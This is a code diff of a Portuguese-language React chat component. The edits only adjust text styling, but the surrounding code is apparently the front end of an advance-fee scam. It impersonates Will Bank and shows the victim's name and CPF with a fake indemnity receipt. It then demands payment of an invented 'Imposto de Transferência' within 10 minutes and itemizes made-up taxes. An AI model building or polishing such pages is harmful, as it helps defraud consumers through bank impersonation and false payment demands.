@@ -319,7 +319,7 @@ const Chat = () => {
         <p className="font-bold text-red-600 flex items-center gap-2">
           ⚠️ ATENÇÃO, {cpfData?.nome?.split(' ')[0]}!
         </p>
-        <p className="text-sm">Confira os dados inseridos para garantir que o valor será transferido corretamente:</p>
+        <p className="text-sm text-primary-foreground">Confira os dados inseridos para garantir que o valor será transferido corretamente:</p>
         <div className="bg-white rounded-lg p-3 border space-y-1 text-foreground">
           <p className="text-foreground"><strong>Nome:</strong> {cpfData?.nome}</p>
           <p className="text-foreground"><strong>Chave Pix:</strong> {cpfData?.cpf}</p>
@@ -398,7 +398,7 @@ const Chat = () => {
 
     // Comprovante Indenizatório
     await addBotMessage(<div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg">
-        <h3 className="text-lg font-bold text-center italic border-b pb-3">Comprovante Indenizatório</h3>
+        <h3 className="text-lg font-bold text-center italic border-b pb-3 bg-card text-primary-foreground">Comprovante Indenizatório</h3>
         
         <div className="bg-amber-50 border-l-4 border-primary p-3 text-sm">
           <p>O Will Bank, com base no processo indenizatório do Sr. (a) <strong>{cpfData?.nome}</strong>, portador do CPF <strong className="text-primary">{cpfData?.cpf}</strong>, <span className="text-primary font-semibold">confirma o direito à indenização por possuir cadastro no Will Bank</span>.</p>
@@ -472,10 +472,10 @@ const Chat = () => {
     await delay(2500);
     await addBotMessage(<div className="bg-red-50 border border-red-200 rounded-xl p-4 space-y-3">
         <p className="font-bold text-red-700">⚠️ ATENÇÃO:</p>
-        <p className="text-sm">A WillBank já iniciou o repasse da sua indenização de <strong className="text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', {
+        <p className="text-sm text-primary-foreground">A WillBank já iniciou o repasse da sua indenização de <strong className="text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', {
             minimumFractionDigits: 2
           })}</strong></p>
-        <p className="text-sm">Para liberar o seu valor é necessário realizar o pagamento do <strong>Imposto de Transferência</strong> em até <strong className="text-red-600">10 minutos</strong>.</p>
+        <p className="text-sm text-primary-foreground">Para liberar o seu valor é necessário realizar o pagamento do <strong>Imposto de Transferência</strong> em até <strong className="text-red-600">10 minutos</strong>.</p>
       </div>, true, 100);
     await delay(2000);
     await addBotMessage(<span>Clique abaixo para entender o motivo do pagamento desse imposto.</span>, true, 55);
@@ -492,7 +492,7 @@ const Chat = () => {
     const ipri = valorBeneficio * 0.0025;
     const totalImposto = ipct + ipti + ipri;
     await addBotMessage(<div className="bg-muted rounded-xl p-4 space-y-2 text-sm">
-        <p className="font-bold">📊 Impostos gerados:</p>
+        <p className="font-bold text-primary-foreground">📊 Impostos gerados:</p>
         <div className="space-y-1">
           <p>• IPCT (Imposto sobre Circulação de Transferência 0,21%): <strong>R$ {ipct.toFixed(2).replace('.', ',')}</strong></p>
           <p>• IPTI (Imposto sobre Transferência Indenizatório 0,25%): <strong>R$ {ipti.toFixed(2).replace('.', ',')}</strong></p>
